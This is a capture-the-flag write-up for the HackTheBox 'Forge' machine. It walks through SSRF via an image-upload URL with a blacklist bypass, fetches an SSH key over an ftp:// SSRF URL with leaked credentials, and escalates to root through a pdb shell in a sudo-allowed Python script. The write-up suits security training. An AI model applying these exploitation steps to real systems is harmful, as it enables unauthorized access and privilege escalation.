# Enumeration
---
## Nmap Scan
```
nmap -A -sC -sV -O -oN nmap forge.htb
```

```bash
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open     http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Gallery

```

## gobuster result
```bash
└─# gobuster vhost -u http://forge.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r 200
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://forge.htb/
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/09/15 19:47:14 Starting gobuster in VHOST enumeration mode
===============================================================
Found: admin.forge.htb (Status: 200) [Size: 27]
```

Here we can see following output on the subdomain **admin.forge.htb**
as it says that only localhost is allowed means we are likely to find the SSRF vulnerability.

<img src="https://github.com/thedarktech/HTB-Writeups/blob/main/Forge/Pasted image 20210915195056.png" />

On the http port we can see that there is a option to upload img but we cant upload our shell as it is using encryption while uloading files
But there is also a option to upload through url so lets check for SSRF

<img src="https://github.com/thedarktech/HTB-Writeups/blob/main/Forge/Pasted image 20210915200551.png" />

```bash
└─# python3 -m http.server 80                                                                                  1 ⨯
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.220.174 - - [15/Sep/2021 20:02:34] code 404, message File not found
10.129.220.174 - - [15/Sep/2021 20:02:34] "GET /temp.php HTTP/1.1" 404 -



```

As you can see above we got the hit on our server that means we can exploit SSRF    

## User

So we will try SSRF on the domain using forge.htb/upload
and we will try to execute the admin subdomain which was accesible for localhost

**Note : Anything that includes localhost or admin or forge is blacklisted so we have to use upper case words like ADMIN.FORGE.HTB**

Every time when we try to exploit SSRF it gives us the link like this

<img src="https://github.com/thedarktech/HTB-Writeups/blob/main/Forge/Pasted image 20210915195321.png" />

And if you try to browse the link it shows following error

<img src="https://github.com/thedarktech/HTB-Writeups/blob/main/Forge/Pasted image 20210915195258.png" />

This error is caused by the browser it self. So lets Go and open this url in burp itself and capture the request.

<img src="https://github.com/thedarktech/HTB-Writeups/blob/main/Forge/Pasted image 20210915195839.png" />

so now the code in the html format is now visible to us.
This was not showing in the browser beacuse the content type is set to image/jpg and the content inside was of html format.

so in the avalible response we can see the link to the announcement page so lets go and cheack that with SSRF

Again we will get a link that we need to open in brup for reading
so we will capture both the requests in the repeater and make changes there

So in the announcement section you get the following response with the ftp password but as the ftp is filtered on the machine we can not access it using the ftp port 

<img src="https://github.com/thedarktech/HTB-Writeups/blob/main/Forge/Pasted image 20210915201535.png" />

```user:heightofsecurity123!```

in the announcements we can see that we are able to pass the url using ?u parameter for uploading purpose 
and we can access the ftp on the browser too so we will take advantage of that
as the ftp is allowed on the /upload endpoint of the admin page 

So lets get that going with SSRF

```url
http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@10.129.220.174/
```

you have to url encode above url before sending it into the burp request

<img src="https://github.com/thedarktech/HTB-Writeups/blob/main/Forge/Pasted image 20210915205232.png" />

You can see that the ftp is accesible in this way and we can access the user.txt file

So as we can access the user.txt which is generally located in the users home directory we can assume that the home directory is accesible to us now

so lets go and grab the users ssh key in order to get user access in the same way we got the flag

<img src="https://github.com/thedarktech/HTB-Writeups/blob/main/Forge/Pasted image 20210915205322.png" />


remember to give 600 permission to id_rsa
```bash
chmod 600 id_rsa 
```
and as the ftp has username as user we will try that for ssh also
and now lets connect to ssh

```bash
└─# ssh user@forge.htb -i id_rsa
The authenticity of host 'forge.htb (10.129.220.174)' can't be established.
ECDSA key fingerprint is SHA256:e/qp97tB7zm4r/sMgxwxPixH0d4YFnuB6uKn1GP5GTw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'forge.htb,10.129.220.174' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 15 Sep 2021 03:24:58 PM UTC

  System load:           0.0
  Usage of /:            43.6% of 6.82GB
  Memory usage:          22%
  Swap usage:            0%
  Processes:             223
  Users logged in:       0
  IPv4 address for eth0: 10.129.220.174
  IPv6 address for eth0: dead:beef::250:56ff:feb9:ca1c


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Aug 20 01:32:18 2021 from 10.10.14.6
user@forge:~$ 

```
And we are in

## Root

so after checking sudo permission we can se that user can execute a python script with no password.

```bash 
user@forge:~$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py

```

So after checking the code we can see the password of the service in clear text form 
```python
user@forge:~$ cat /opt/remote-manage.py
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:

```

And also we can see that the script imports the pdb package that could be helpful for use in order to privillage escallation if we some how get the pdb shell.

so lets go and fire up the script

```bash
user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:59961

```

so the program creates a service which is listning on the random port
but you have to connect to it using local host only 
so open two ssh session and start service in one
and connect to it with other ssh session of user

```bash
user@forge:~$ nc localhost 55865
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do: 
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
sdgg

```

when you raise an exception in the client side by giving unexpected input like chaeacters  you can see a pdb shell popped out in the ssh session where you stared the service

```bash
user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:55865
invalid literal for int() with base 10: b'sdgg'
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb) 
```

now we can run any python command in here
as our service was running as sudo 
if we try to access the /bin/bash using OS library in python 
the root shell should be returned to us....
```python
import os; os.system("/bin/bash")
```

```bash
(Pdb) import os; os.system("/bin/bash")
root@forge:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
root@forge:/home/user# whoami
root
root@forge:/home/user# w
```

